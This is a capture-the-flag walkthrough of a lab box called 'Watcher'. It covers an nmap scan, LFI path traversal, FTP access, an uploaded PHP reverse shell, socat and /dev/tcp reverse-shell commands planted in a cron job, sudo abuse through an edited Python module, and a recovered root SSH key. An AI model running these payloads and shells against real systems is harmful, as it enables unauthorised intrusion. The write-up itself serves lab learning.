# Watcher

## NMAP
```
# Nmap 7.91 scan initiated Mon Jul  5 14:43:49 2021 as: nmap -sV -p- -n -Pn -T4 -A -o nmap.txt 10.10.108.143
Warning: 10.10.108.143 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.108.143
Host is up (0.17s latency).
Not shown: 65445 closed ports, 87 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  5 15:02:39 2021 -- 1 IP address (1 host up) scanned in 1129.88 seconds
```

- tried using feroxbuster and dirb, but didn't find anything intresting other than robot.txt.
- while checking the directory inside we found in robots.txt we got a flag. But while cheking second one http://10.10.0.46/secret_file_do_not_read.txt the permission is denied.

## LFI
- we can see the link inputs a file but while modiyfying input we can see passwd file and thus we can confirm it has LFI vulnerability.
http://10.10.31.251/post.php?post=../../../../../etc/passwd
- Now let us check whether we can output secret_file_do_not_read.txt.
- http://10.10.31.251/post.php?post=../../../../../var/www/html/secret_file_do_not_read.txt and we are able to see secret_file_do_not_read.txt file.
- We got FTP user and password.

## FTP

- Login to FTP using ftpuser.
- We got second flag.
- Here there is a folder which we permission to upload.
- Upload a php_reverse_shell.
- We know path to uploaded shell from http://10.10.31.251/post.php?post=secret_file_do_not_read.txt file.
- Start nc listner and invoke the shell.
- http://10.10.31.251/post.php?post=../../../../../home/ftpuser/ftp/files/shell.php
- Now we have a shell.

## Reverse shell www-data
- upgrade shell:
```
/usr/bin/script -qc /bin/bash /dev/null
control+z to background
stty raw -echo
fg
export TERM=xterm
```
- or can upgrade with socat.
on kali: `socat file:`tty`,raw,echo=0 tcp-listen:4444`
on victim: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`
if there is no socat installed i=on victim we can use standalone binary from https://github.com/andrew-d/static-binaries or using command `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat;` and uploading to the victim.
- now we got next flag.
- after seeing `sudo -l` we can see ww-data can run anything as toby. Lets run a bash shell.
- `sudo -u toby /bib/bash`
- now are toby.

## shell toby
- Now we have flag 4.
- There is cron job running every minute by mat and we have write permisson. `cat /etc/crontab`
- Lets put `bash -i >& /dev/tcp/10.8.98.192/4444 0>&1` and open nc listner and wait for connction.
- We got the connection.

## shell mat
- Now we have flag 5.
- Stabilize the shell.
- run `sudo -l`
- we can run a script will_script.py as will. lets check it out.
```
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)

```
- The script invoke a cmd.py which mat have owner permission. Lets edit cmd.py
```
def get_command(num):                                                                         
        if(num == "1"):                                                                       
                return "bash"                                                                 
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```
- Now run `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1` and we have escalated shell to will.

## shell will
- Now we have flag 6.
- Lets find something to escalate privilege to root.
- After running linpeas found /opt/backup folder. Lets check it out.
- We have key.64 inside the folder. Lets download it to local machine.
- it appears to be base64 encoded. decode it.
- It is a ssh key.
- `chmod 600 key`

## ssh root
- `ssh -i key root@IP`
- Now we are logged in as root.
- We have flag 7.

***
